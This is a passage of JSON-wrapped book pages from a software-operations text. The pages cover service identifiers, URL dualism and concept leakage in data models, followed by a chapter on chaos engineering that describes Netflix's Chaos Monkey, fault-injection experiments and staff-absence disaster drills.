      "content": "Information Architecture • 317\n\n2. One owner can only have one catalog. If a consuming application needs more than one catalog, it has to create multiple identities in the authority service (multiple account IDs in Active Directory, for example). We should remove the idea of ownership from the catalog service altogether. It should be happy to create many, many fine catalogs for anyone who wants one. That means the protocol looks more like the next figure. Any user can create a catalog. The catalog service issues an identifier for that specific cat- alog. The user provides that catalog ID on subsequent requests. Of course, a catalog URL is a perfectly adequate identifier.\n\nCatalog URL\n\nCaller\n\nCatalogsService\n\nCreate (POST to Catalogs Service)\n\nAdd (PUT to Catalog URL)\n\nItem URL\n\nQuery (GET on Catalog URL w/query params)Results\n\nIn effect, the catalog service acts like a little standalone SaaS business. It has many customers, and the customers get to decide how they want to use that catalog. Some users will be busy and dynamic. They will change their catalogs all the time. Other users may be limited in time, maybe just building a catalog for a one-time promotion. That’s totally okay. Different users may even have different ownership models.\n\nYou probably still need to ensure that callers are allowed to access a partic- ular catalog. This is especially true when you open the service up to your business partners. As shown in the figure on page 318, a “policy proxy” can map from a client ID (whether that client is internal or external makes no difference) to a catalog ID. This way, questions of ownership and access control can be factored out of the catalog service itself into a more centrally controlled location.\n\nreport erratum • discuss",
      "content_length": 1765,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 322,
      "content": "Chapter 16. Adaptation • 318\n\nCallercatalog ID\n\nclient ID\n\nCatalogService\n\nPolicy Proxy\n\nMap fromclient ID to catalog IDclient ID\n\ncatalog ID\n\nServices should issue their own identifiers. Let the caller keep track of own- ership. This makes the service useful in many more contexts.\n\nURL Dualism\n\nWe can use quotation marks when we want to talk about a word, rather than using the word itself. For example, we can say the word “verbose” means “using too many words.” It’s a bit like the difference between a pointer and a value. We understand that the pointer stands in as a way to refer to the value.\n\nURLs have the same duality. A URL is a reference to a representation of a value. You can exchange the URL for that representation by resolving it—just like dereferencing the point. Like a pointer, you can also pass the URL around as an identifier. A program may receive a URL, store it as a text string, and pass it along without ever attempting to resolve it. Or your program might store the URL as an identifier for some thing or person, to be returned later when a caller presents the same URL.\n\nIf we truly make use of this dualism, we can break a lot of dependencies that otherwise seem impossible.\n\nHere’s another example drawn from the world of online retail. A retailer has a spiffy site to display items. The typical way to get the item information is shown in the figure on page 319. An incoming request contains an item ID. The front end looks up that ID in the database, gets the item details, and displays them.\n\nreport erratum • discuss",
      "content_length": 1553,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 323,
      "content": "Information Architecture • 319\n\nCaller\n\nitemID = “12345”\n\nCatalog\n\nItemsselect * from item where item_id = “12345”\n\nObviously this works. A lot of business gets done with this model! But consider the chain of events when our retailer acquires another brand. Now we have to get all the retailer’s items into our database. That’s usually very hard, so we decide to have the front end look at the item ID and decide which database to hit, as shown in the figure that follows.\n\nCaller\n\nitemID = “ab9876”\n\nCatalog\n\nOld &BustedItemsselect * from hot where id = “9876”\n\nNewHotnessItems\n\n“items like ab* comefrom new hotness”\n\nreport erratum • discuss",
      "content_length": 643,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 324,
      "content": "Chapter 16. Adaptation • 320\n\nThe problem is that we now have exactly two databases of items. In computer systems, “two” is a ridiculous number. The only numbers that make sense are “zero,” “one,” and “many.” We can use URL dualism to support many databases by using URLs as both the item identifier and a resolvable resource. That model is shown in the following figure.\n\ngetURL\n\nCaller\n\nitemID = “http://example.com/new/hot/9876”\n\nCatalog\n\nOld &BustedItems\n\nNewHotnessItems\n\nNew Hotness ItemsService\n\nProxy with Rewrites\n\nOutbound APIGateway\n\nExternalPartner\n\nIt might seem expensive to resolve every URL to a source system on every call. That’s fine; introduce an HTTP cache to reduce latency.\n\nThe beautiful part of this approach is that the front end can now use services that didn’t even exist when it was created. As long as the new service returns a useful representation of that item, it will work.\n\nAnd who says the item details have to be served by a dynamic, database- backed service? If you’re only ever looking these up by URL, feel free to publish static JSON, HTML, or XML documents to a file server. For that matter, nothing says these item representations even have to come from inside your own company. The item URL could point to an outbound API gateway that proxies a request to a supplier or partner.\n\nYou might recognize this as a variation of “Explicit Context.” (See Explicit Context, on page 306.) We use URLs because they carry along the context we need to fetch the underlying representation. It gives us much more flexibility than plugging item ID numbers into a URL template string for a service call.\n\nreport erratum • discuss",
      "content_length": 1657,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 325,
      "content": "Information Architecture • 321\n\nYou do need to be a bit careful here. Don’t go making requests to any arbitrary URL passed in to you by an external user. See Chapter 11, Security, on page 215, for a shocking array of ways attackers could use that against you. In practice, you need to encrypt URLs that you send out to users. That way you can verify that whatever you receive back is something you generated.\n\nEmbrace Plurality\n\nOne of the basic enterprise architecture patterns is the “Single System of Record.” The idea is that any particular concept should originate in exactly one system, and that system will be the enterprise-wide authority on entities within that concept.\n\nThe hard part is getting all parts of the enterprise to agree on what those concepts actually are.\n\nPick an important noun in your domain, and you’ll find a system that should manage every instance of that noun. Customer, order, account, payment, policy, patient, location, and so on. A noun looks simple. It fools us. Across your organization, you’ll collect several definitions of every noun. For example:\n\nA customer is a company with which we have a contractual relationship.\n\nA customer is someone entitled to call our support line.\n\nA customer is a person who owes us money or has paid us money in\n\nthe past.\n\nA customer is someone I met at a trade show once that might buy some-\n\nthing someday in the future.\n\nSo which is it? The truth is that a customer is all of these things. Bear with me for a minute while I get into some literary theory. Nouns break down. Being a “customer” isn’t the defining trait of a person or company. Nobody wakes up in the morning and says, “I’m happy to be a General Mills cus- tomer!” “Customer” describes one facet of that entity. It’s about how your organization relates to that entity. To your sales team, a customer is someone who might someday sign another contract. To your support organization, a customer is someone who is allowed to raise a ticket. To your accounting group, a customer is defined by a commercial relationship. Each of those groups is interested in different attributes of the customer. Each applies a different life cycle to the idea of what a customer is. Your support team doesn’t want its “search by name” results cluttered up with every prospect your sales team ever pursued. Even the question, “Who is allowed to create a customer instance?” will vary.\n\nreport erratum • discuss",
      "content_length": 2429,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 326,
      "content": "Chapter 16. Adaptation • 322\n\nThis challenge was the bane of enterprise-wide shared object libraries, and it’s now the bane of enterprise-wide shared services.\n\nAs if those problems weren’t enough, there’s also the “dark matter” issue. A system of record must pick a model for its entities. Anything that doesn’t fit the model can’t be represented there. Either it’ll go into a different (possibly covert) database or it just won’t be represented anywhere.\n\nInstead of creating a single system of record for any given concept, we should think in terms of federated zones of authority. We allow different systems to own their own data, but we emphasize interchange via common formats and representations. Think of this like duck-typing for the enterprise. If you can exchange a URL for a representation that you can use like a customer, then as far as you care, it is a customer service, whether the data came from a database or a static file.\n\nAvoid Concept Leakage\n\nAn electronics retailer was late to the digital music party. But it wanted to start selling tracks on its website. The project presented many challenges to its data model. One of the tough nuts was about pricing. The company’s existing systems were set up to price every item individually. But with digital music, the company wanted the ability to price and reprice items in very large groups. Hundreds of thousands of tracks might go from $0.99 to $0.89 overnight. None of its product management or merchandising tools could handle that.\n\nSomeone created a concept of a “price point” as an entity for the product management database. That way, every track record could have a field for its specific price point. Then all the merchant would need to do is change the “amount” field on the price point and all related tracks would be repriced.\n\nThis was an elegant solution that directly matched the users’ conceptual model of pricing these new digital tracks. The tough question came when we started talking about all the other downstream systems that would need to receive a feed of the price points.\n\nUntil this time, items had prices. The basic customer-visible concepts of cat- egory, product, and item were very well established. The internal hierarchy of department, class, and subclass were also well understood. Essentially every system that received item data also received these other concepts.\n\nBut would they all need to receive the “price point” data as well?\n\nreport erratum • discuss",
      "content_length": 2464,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 327,
      "content": "Information Architecture • 323\n\nIntroducing price point as a global concept across the retailer’s entire constel- lation of systems was a massive change. The ripple effect would be felt for years. Coordinating all the releases needed to introduce that concept would make Rube Goldberg shake his head in sadness. But it looked like that was required because every other system certainly needed to know what price to display, charge, or account for on the tracks.\n\nBut price point was not a concept that other systems needed for their own purposes. They just needed it because the item data was now incomplete thanks to an upstream data model change.\n\nThat was a concept leaking out across the enterprise. Price point was a concept the upstream system needed for leverage. It was a way to let the humans deal with complexity in that product master database. To every system downstream it was incidental complexity. The retailer would’ve been just as well served if the upstream system flattened out the price attribute onto the items when it published them.\n\nThere’s no such thing as a natural data model, there are only choices we make about how to represent things, relationships, and change over time. We need to be careful about exposing internal concepts to other systems. It creates semantic and operational coupling that hinders future change.\n\nSummary\n\nWe don’t capture reality, we only model some aspects of it. There’s no such thing as a “natural” data model, only choices that we make. Every paradigm for modeling data makes some statements easy, others difficult, and others impossible. It’s important to make deliberate choices about when to use relational, document, graph, key-value, or temporal databases.\n\nWe always need to think about whether we should record the new state or the change that caused the new state. Traditionally, we built systems to hold the current state because there just wasn’t enough disk space in the world. That’s not our problem today!\n\nUse and abuse of identifiers causes lots of unnecessary coupling between systems. We can invert the relationship by making our service issue identifiers rather than receiving an “owner ID.” And we can take advantage of the dual nature of URLs to both act like an opaque token or an address we can deref- erence to get an entity.\n\nFinally, we must be careful about exposing concepts to other systems. We may be forcing them to deal with more structure and logic than they need.\n\nreport erratum • discuss",
      "content_length": 2480,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 328,
      "content": "Chapter 16. Adaptation • 324\n\nWrapping Up\n\nChange is the defining characteristic of software. That change—that adaptation —begins with release. Release is the beginning of the software’s true life; everything before that release is gestation. Either systems grow over time, adapting to their changing environment, or they decay until their costs out- weigh their benefits and then die.\n\nWe can make change cost less and hurt less by planning for releases to pro- duction as an integral part of our software. That’s in contrast to designing for change inside the software but disregarding the act of making that change live in production.\n\nreport erratum • discuss",
      "content_length": 663,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 329,
      "content": "CHAPTER 17\n\nChaos Engineering\n\nImagine a conversation that starts like this:\n\n“Hey boss, I’m going to log into production and kill some boxes. Just a few here and there. Shouldn’t hurt anything,” you say.\n\nHow do you think the rest of that conversation will go? It might end up with a visit from Human Resources and an order to clean out your desk. Maybe even a visit to the local psychiatric facility! Killing instances turns out to be a radical idea—but not a crazy one. It’s one technique in an emerging discipline called “chaos engineering.”\n\nBreaking Things to Make Them Better\n\nAccording to the principles of chaos engineering,1 chaos engineering is “the discipline of experimenting on a distributed system in order to build confi- dence in the system’s capability to withstand turbulent conditions in pro- duction.” That means it’s empirical rather than formal. We don’t use models to understand what the system should do. We run experiments to learn what it does.\n\nChaos engineering deals with distributed systems, frequently large-scale systems. Staging or QA environments aren’t much of a guide to the large- scale behavior of systems in production. In Scaling Effects, on page 71, we saw how different ratios of instances can cause qualitatively different behavior in production. That also applies to traffic. Congested networks behave in a qualitatively different way than uncongested ones. Systems that work fine in a low-latency, low-loss network may break badly in a congested network. We also have to think about the economics of staging environments. They’re never going to be full-size replicas of production. Are you going to build a\n\n1.\n\nhttp://principlesofchaos.org\n\nreport erratum • discuss",
      "content_length": 1712,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 330,
      "content": "Chapter 17. Chaos Engineering • 326\n\nsecond Facebook as the staging version of Facebook? Of course not. This all makes it hard to gain understanding of a whole system from a non-production environment.\n\nWhy all the emphasis on the full system? Many problems only reveal them- selves in the whole system (for example, excessive retries leading to timeouts, cascading failures, dogpiles, slow responses, and single points of failure, to name a few).\n\nWe can’t simulate these in a nonproduction environment because of the scale problem. We also can’t gain confidence by testing components in isolation. It turns out that like concurrency, safety is not a composable property. Two services may each be safe on their own, but the composition of them isn’t necessarily safe. For example, consider the system in the following figure. The client enforces a 50-millisecond timeout on its calls. Each of the providers has the response time distribution shown: an average of 20 milliseconds, but an observed 99.9 percentile of 30 milliseconds.\n\nProvider 2\n\nClient\n\nProvider 1\n\nResponsetime distribution\n\n20ms\n\n40ms\n\nResponsetime distribution\n\n20ms\n\n40ms\n\nTimeout: 50 ms\n\nThe client can call either of the services with high confidence. But suppose it needs to call both of them in sequence. On average, the two calls will still meet the 50-millisecond time budget. A sizable percentage of calls are going to break that window, though. The client now looks unreliable. This is why chaos engineering emphasizes the whole-system perspective. It deals with emergent properties that can’t be observed in the individual components.\n\nAntecedents of Chaos Engineering\n\nChaos engineering draws from many other fields related to safety, reliability, and control, such as cybernetics, complex adaptive systems, and the study of high-reliability organizations. In particular, the multidisciplinary field of resilience engineering offers a rich area to explore for new directions in chaos.2\n\n2.\n\nhttps://www.kitchensoap.com/2011/04/07/resilience-engineering-part-i\n\nreport erratum • discuss",
      "content_length": 2066,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 331,
      "content": "Antecedents of Chaos Engineering • 327\n\nLimit ofSafety\n\nLimit ofEconomy\n\nLimit ofCapacity\n\nDrift over time\n\nSafetyBarrier\n\nIn Drift into Failure [Sid11] Sidney Dekker, one of the pioneers in resilience engineer- ing, talks about “drift” as a phenomenon. A system exists in a realm with three key boundaries, as shown in the figure. (In this context, when Dekker talks about systems, he means the whole collection of people, technology, and processes, not just the information systems.) Over time, there’s pressure to increase the economic return of the system. Human nature also means people don’t want to work at the upper limit of possible productivity. Those forces combine to create a gradient that pushes the whole system closer to the safety boundary and the barriers we create to prevent disasters.\n\nDekker illustrates this idea using an airliner as an example. Jet aircraft can fly faster at higher altitudes (subject to a trade-off in fuel efficiency). Faster trips mean more turnarounds on the aircraft and thus greater revenue via carrying more passengers. However, at the optimum flight altitude for revenue, the range between the aircraft’s stall speed and the speed where the flight surfaces create turbulence are much closer together than where the air is thicker. Consequently, there’s less room for error at the economically optimum altitude.\n\nWe can see the same effect in a distributed system (using system in our usual sense here). In the absence of other forces, we will optimize the system for maximum gain. We’ll push throughput up to the limit of what the machines and network can bear. The system will be maximally utilized and maximally profitable...right up until the time a disruption occurs.\n\nHighly efficient systems handle disruption badly. They tend to break all at once.\n\nChaos engineering provides that balancing force. It springs from the view that says we need to optimize our systems for availability and tolerance to disrup- tion in a hostile, turbulent world rather than aiming for throughput in an idealized environment.\n\nAnother thread that led to chaos engineering has to do with the challenge of measuring events that don’t happen. In General Principles of Systems Design [Wei88], Gerald Weinberg describes the “fundamental regulator paradox” (where regulator is used in the sense of a feedback and control component, not in a governmental context):\n\nreport erratum • discuss",
      "content_length": 2418,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 332,
      "content": "Chapter 17. Chaos Engineering • 328\n\nThe task of a regulator is to eliminate variation, but this variation is the ultimate source of information about the quality of its work. Therefore, the better job a regulator does, the less information it gets about how to improve.\n\nThis was once paraphrased as, “You don’t know how much you depend on your IT staff until they go on vacation.”\n\nA related paradox is the “Volkswagen microbus” paradox: You learn how to fix the things that often break. You don’t learn how to fix the things that rarely break. But that means when they do break, the situation is likely to be more dire. We want a continuous low level of breakage to make sure our system can handle the big things.\n\nFinally, Nassim Taleb’s Antifragile [Tal12] describes systems that improve from stresses. Distributed information systems don’t naturally fall into that category! In fact, we expect that disorder will occur, but we want to make sure there’s enough of it during normal operation that our systems aren’t flummoxed when it does occur. We use chaos engineering the way a weightlifter uses iron: to create tolerable levels of stress and breakage to increase the strength of the system over time.\n\nThe Simian Army\n\nProbably the best known example of chaos engineering is Netflix’s “Chaos Monkey.” Every once in a while, the monkey wakes up, picks an autoscaling cluster, and kills one of its instances. The cluster should recover automatically. If it doesn’t, then there’s a problem and the team that owns the service has to fix it.\n\nThe Chaos Monkey tool was born during Netflix’s migration to Amazon’s AWS cloud infrastructure and a microservice architecture. As services proliferated, engineers found that availability could be jeopardized by an increasing number of components. Unless they found a way to make the whole service immune to component failures, they would be doomed. So every cluster needed to autoscale and recover from failure of any instance. But how can you make sure that every deployment of every cluster stays robust when hidden coupling is so easy to introduce?\n\nThe company’s choice was not an “either/or” between making components more robust versus making the whole system more robust. It was an “and.” They would use stability patterns to make individual instances more likely to survive. But there’s no amount of code you can put into an instance that keeps AWS from terminating the instance! Instances in AWS get terminated just often enough to be a big problem as you scale, but not so often that every\n\nreport erratum • discuss",
      "content_length": 2572,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 333,
      "content": "Adopting Your Own Monkey • 329\n\ndeployment of every service would get tested. Basically, Netflix needed failures to happen more often so that they became totally routine. (This is an example of the agile adage, “If something hurts, do it more often.”)\n\nOther monkeys have followed: Latency Monkey, Janitor Monkey, Conformity Monkey, and even Chaos Kong. Netflix has made the “Simian Army” open source.3 From this, the company has learned every new kind of monkey it creates improves its overall availability. Second, as noted by Heather Nakama at the third Chaos Community Day, people really like the word “monkey.”\n\nOpt In or Opt Out?\n\nAt Netflix, chaos is an opt-out process. That means every service in production will be subject to Chaos Monkey. A service owner can get a waiver, but it requires sign-off. That isn’t just a paper process...exempt services go in a database that Chaos Monkey consults. Being exempt carries a stigma. Engi- neering management reviews the list periodically and prods service owners to fix their stuff.\n\nOther companies adopting chaos engineering have chosen an opt-in approach. Adoption rates are much lower in opt-in environments than in opt-out. However, that may be the only feasible approach for a mature, entrenched architecture. There may simply be too much fragility to start running chaos tests everywhere.\n\nWhen you’re adding chaos to an organization, consider starting with opting in. That will create much less resistance and allow you to publicize some success stories before moving to an opt-out model. Also, if you start with opt- out, people might not fully understand what they’re opting out from. Or rather, they might not realize how serious it could be if they don’t respond to the opt- out but should have!\n\nAdopting Your Own Monkey\n\nWhen Chaos Monkey launched, most developers were surprised by how many vulnerabilities it uncovered. Even services that had been in production for ages turned out to have subtle configuration problems. Some of them had cluster membership rosters that grew without bounds. Old IP addresses would stay on the list, even though the owner would never be seen again. (Or worse, if that IP came back it was as a different service!)\n\n3.\n\nhttp://netflix.github.io\n\nreport erratum • discuss",
      "content_length": 2269,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 334,
      "content": "Chapter 17. Chaos Engineering • 330\n\nPrerequisites\n\nFirst of all, your chaos engineering efforts can’t kill your company or your customers.\n\nIn a sense, Netflix had it easy. Customers are familiar with pressing the play button again if it doesn’t work the first time. They’ll forgive just about anything except cutting off the end of Stranger Things. If every single request in your system is irreplaceably valuable, then chaos engineering is not the right approach for you. The whole point of chaos engineering is to disrupt things in order to learn how the system breaks. You must be able to break the system without breaking the bank!\n\nYou also want a way to limit the exposure of a chaos test. Some people talk about the “blast radius”...meaning the magnitude of bad experiences both in terms of the sheer number of customers affected and the degree to which they’re disrupted. To keep the blast radius under control, you often want to pick “victims” based on a set of criteria. It may be as simple as “every 10,000th request will fail” when you get started, but you’ll soon need more sophisticated selections and controls.\n\nYou’ll need a way to track a user and a request through the tiers of your system, and a way to tell if the whole request was ultimately successful or not. That trace serves two purposes. If the request succeeds, then you’ve uncovered some redundancy or robustness in the system. The trace will tell you where the redundancy saves the request. If the request fails, the trace will show you where that happened, too.\n\nYou also have to know what “healthy” looks like, and from what perspective. Is your monitoring good enough to tell when failure rates go from 0.01 percent to 0.02 percent for users in Europe but not in South America? Be wary that measurements may fail when things get weird, especially if monitoring shares the same network infrastructure as production traffic. Also, as Charity Majors, CEO of Honeycomb.io says, “If you have a wall full of green dashboards, that means your monitoring tools aren’t good enough.” There’s always something weird going on.\n\nFinally, make sure you have a recovery plan. The system may not automat- ically return to a healthy state when you turn off the chaos. So you will need to know what to restart, disconnect, or otherwise clean up when the test is done.\n\nreport erratum • discuss",
      "content_length": 2359,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 335,
      "content": "Adopting Your Own Monkey • 331\n\nDesigning the Experiment\n\nLet’s say you’ve got great measurements in place. Your A/B testing system can tag a request as part of a control group or a test group. It’s not quite time to randomly kill some boxes yet. First you need to design the experiment, beginning with a hypothesis.\n\nThe hypothesis behind Chaos Monkey was, “Clustered services should be unaffected by instance failures.” Observations quickly invalidated that hypothesis. Another hypothesis might be, “The application is responsive even under high latency conditions.”\n\nAs you form the hypothesis, think about it in terms of invariants that you expect the system to uphold even under turbulent conditions. Focus on externally observable behavior, not internals. There should be some healthy steady state that the system maintains as a whole.\n\nOnce you have a hypothesis, check to see if you can even tell if the steady state holds now. You might need to go back and tweak measurements. Look for blind spots like a hidden delay in network switches or a lost trace between legacy applications.\n\nNow think about what evidence would cause you to reject the hypothesis. Is a non-zero failure rate on a request type sufficient? Maybe not. If that request starts outside your organization, you probably have some failures due to external network conditions (aborted connections on mobile devices, for example). You might have to dust off those statistics textbooks to see how large a change constitutes sufficient evidence.\n\nInjecting Chaos\n\nThe next step is to apply your knowledge of the system to inject chaos. You know the structure of the system well enough to guess where you can kill an instance, add some latency, or make a service call fail. These are all “injec- tions.” Chaos Monkey does one kind of injection: it kills instances.\n\nKilling instances is the most basic and crude kind of injection. It will abso- lutely find weaknesses in your system, but it’s not the end of the story.\n\nLatency Monkey adds latency to calls. This strategy finds two additional kinds of weaknesses. First, some services just time out and report errors when they should have a useful fallback. Second, some services have undetected race conditions that only become apparent when responses arrive in a different order than usual.\n\nreport erratum • discuss",
      "content_length": 2338,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 336,
      "content": "Chapter 17. Chaos Engineering • 332\n\nWhen you have deep trees of service calls, your system may be vulnerable to loss of a whole service. Netflix uses failure injection testing (FIT) to inject more subtle failures.4 (Note that this is not the same “FIT” as the “framework for integrated testing” in Nonbreaking API Changes, on page 263.) FIT can tag a request at the inbound edge (at an API gateway, for example) with a cookie that says, “Down the line, this request is going to fail when service G calls service H.” Then at the call site where G would issue the request to H, it looks at the cookie, sees that this call is marked as a failure, and reports it as failed, without even making the request. (Netflix uses a common framework for all its outbound service calls, so it has a way to propagate this cookie and treat it uniformly.)\n\nNow we have three injections that can be applied in various places. We can kill an instance of any autoscaled cluster. We can add latency to any network connection. And we can cause any service-to-service call to fail. But which instances, connections, and calls are interesting enough to inject a fault? And where should we inject that fault?\n\nIntroducing Chaos to Your Neighbors by: Nora Jones , Senior Software Engineer and Coauthor of Chaos Engineering (O’Reilly, 2017)\n\nI was hired as the first and only person working on internal tools and developer productivity at a brand new e-commerce startup during a pivotal time. We had just launched the site, we were releasing code multiple times a day, and not to mention our marketing team was crushing it, so we already had several customers expecting solid performance and availability from the site from day one.\n\nThe lightning feature development speed led to a lack of tests and general caution, which ultimately led to precarious situations at times that were not ideal (read: being paged at 4 a.m. on a Saturday). About two weeks into my role at this company, my manager asked me if we could start experimenting with chaos engineering to help detect some of these issues before they became major outages. Given that I was new to the company and didn’t know all my col- leagues yet, I started this effort by sending an email to all the developers and business owners informing them we were beginning implementation of chaos engineering in QA and if they considered their services “unsafe to chaos” to let me know and they could opt out the first round. I didn’t get much response. After a couple weeks of waiting and nagging I assumed the silence implied consent and unleashed my armies of chaos. We ended up taking QA down for a week and I pretty much ended up meeting everyone that worked at the company. Moral of the story: chaos engineering is a quick way to meet your new colleagues, but it’s not a great way. Proceed with caution and control your failures delicately, especially when it’s the first time you’re enabling chaos.\n\n4.\n\nhttps://medium.com/netflix-techblog/fit-failure-injection-testing-35d8e2a9bb2\n\nreport erratum • discuss",
      "content_length": 3037,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 337,
      "content": "Adopting Your Own Monkey • 333\n\nTargeting Chaos\n\nYou could certainly use randomness. This is how Chaos Monkey works. It picks a cluster at random, picks an instance at random, and kills it. If you’re just getting started with chaos engineering, then random selection is as good a process as any. Most software has so many problems that shooting at ran- dom targets will uncover something alarming.\n\nOnce the easy stuff is fixed, you’ll start to see that this is a search problem. You’re looking for faults that lead to failures. Many faults won’t cause failures. In fact, on any given day, most faults don’t result in failures. (More about that later in this chapter.) When you inject faults into service-to-service calls, you’re searching for the crucial calls. As with any search problem, we have to confront the challenge of dimensionality.\n\nSuppose there’s a partner data load process that runs every Tuesday. A fault during one part of that process causes bad data in the database. Later, when using that data to present an API response, a service throws an exception and returns a 500 response code. How likely are you to find that problem via random search? Not very likely.\n\nRandomness works well at the beginning because the search space for faults is densely populated. As you progress, the search space becomes more sparse, but not uniform. Some services, some network segments, and some combina- tions of state and request will still have latent killer bugs. But imagine trying to exhaustively search a dimensional space, where n is the number of calls from service to service. In the worst case, if you have x services, there could be\n\n2n\n\n22x\n\npossible faults to inject!\n\nAt some point, we can’t rely just on randomness. We need a way to devise more targeted injections. Humans can do that by thinking about how a suc- cessful request works. A top-level request generates a whole tree of calls that support it. Kick out one of the supports, and the request may succeed or it may fail. Either way we learn something. This is why it’s important to study all the times when faults happen without failures. The system did something to keep that fault from becoming a failure. We should learn from those happy outcomes, just as we learn from the negative ones.\n\nAs humans, we apply our knowledge of the system together with abductive reasoning and pattern matching. Computers aren’t great at that, so we still have an edge when picking targets for chaos. (But see Cunning Malevolent Intelligence, on page 334, for some developing work.)\n\nreport erratum • discuss",
      "content_length": 2571,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 338,
      "content": "Chapter 17. Chaos Engineering • 334\n\nCunning Malevolent Intelligence\n\nPeter Alvaro, a researcher at the University of California–Santa Cruz, works on prin- ciples for learning how to break systems by observing what they do well. It starts by collecting traces of normal workload. That workload will be subject to the usual daily stresses of production operations, but it isn’t deliberately perturbed by chaos engi- neering. (At least, not quite yet.)\n\nUsing those traces, it’s possible to build a database of inferences about what services a request type needs. That looks like a graph, so we can use graph algorithms to find links to cut with an experimentation platform. (See Automate and Repeat, on page 334, to read about ChAP, Netflix’s experimentation platform.) Once that link is cut, we may find that the request continues to succeed. Maybe there’s a secondary service, so we can see a new call that wasn’t previously active. That goes into the database, just like we humans would learn about the redundancy. There may not be a secondary call, but we just learn that the link we cut wasn’t that crucial after all.\n\nA few iterations of this process can drastically narrow down the search space. Peter calls this building a “cunning malevolent intelligence.” It can dramatically reduce the time needed to run productive chaos tests.\n\nAutomate and Repeat\n\nSo far, this sounds like an engineering lab course. Shouldn’t something called “chaos” be fun and exciting? No! In the best case, it’s totally boring because the system just keeps running as usual.\n\nAssuming we did find a vulnerability, things probably got at least a little exciting in the recovery stages. You’ll want to do two things once you find a weakness. First, you need to fix that specific instance of weakness. Second, you want to see what other parts of your system are vulnerable to the same class of problem.\n\nWith a known class of vulnerability, it’s time to find a way to automate testing. Along with automation comes moderation. There’s such a thing as too much chaos. If the new injection kills instances, it probably shouldn’t kill the last instance in a cluster. If the injection simulates a request failure between service G to service H, then it isn’t meaningful to simultaneously fail requests from G to every fallback it uses when H isn’t working!\n\nCompanies with dedicated chaos engineering teams are all building platforms that let them decide how much chaos to apply, when, to whom, and which services are off-limits. These make sure that one poor customer doesn’t get\n\nreport erratum • discuss",
      "content_length": 2582,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 339,
      "content": "Disaster Simulations • 335\n\nflagged for all the experiments at once! For example, Netflix calls its the “Chaos Automation Platform” (ChAP).5\n\nThe platform makes decisions about what injections to apply and when, but it usually leaves the “how” up to some existing tool. Ansible is a popular choice, since it doesn’t require a special agent on the targeted nodes. The platform also needs to report its tests to monitoring systems, so you can correlate the test events with changes in production behavior.\n\nDisaster Simulations\n\nChaos isn’t always about faults in the software. Things happen to people in our organizations, too. Every single person in your organization is mortal and fallible. People get sick. They break bones. They have family emergencies. Sometimes they just quit without notice. Natural disasters can even make a building or an entire city inaccessible. What happens when your single point of failure goes home every evening?\n\nHigh-reliability organizations use drills and simulations to find the same kind of systemic weaknesses in their human side as in the software side.\n\nIn the large, this may be a “business continuity” exercise, where a large portion of the whole company is involved. It’s possible to run these at smaller scales. Basically, you plan a time where some number of people are designated as “incapacitated.” Then you see if you can continue business as usual.\n\nYou can make this more fun by calling it a “zombie apocalypse simulation.” Randomly select 50 percent of your people and tell them they are counted as zombies for the day. They are not required to eat any brains, but they are required to stay away from work and not respond to communication attempts.\n\nAs with Chaos Monkey, the first few times you run this simulation, you’ll immediately discover some key processes that can’t be done when people are out. Maybe there’s a system that requires a particular role that only one person has. Or another person holds the crucial information about how to configure a virtual switch. During the simulation, record these as issues.\n\nAfter the simulation, review the issues, just like you would conduct a post- mortem on an outage. Decide how to correct for the gaps by improving docu- mentation, changing roles, or even automating a formerly manual process.\n\n5.\n\nhttps://medium.com/netflix-techblog/chap-chaos-automation-platform-53e6d528371f\n\nreport erratum • discuss",
      "content_length": 2409,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 340,
      "content": "Chapter 17. Chaos Engineering • 336\n\nIt’s probably not a good idea to combine fault injections together with a zombie simulation for your very first run-through. But after you know you can survive a day of normal operations without people, ramp up the system stress by creating an abnormal situation while you’re at 20 percent zombiehood.\n\nOne final safety note: Be sure you have a way to abort the exercise. Make sure the zombies know a code word you can use to signal “this is not part of the drill,” in case a major situation comes up and you go from “learning opportunity” to “existential crisis.”\n\nWrapping Up\n\nChaos engineering starts with paradoxes. Stable systems become fragile. Dependencies creep in and failure modes proliferate whenever you turn your back on the software. We need to break things—regularly and in a semicon- trolled way—to make the software and the people who build it more resilient.\n\nreport erratum • discuss",
      "content_length": 939,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 341,
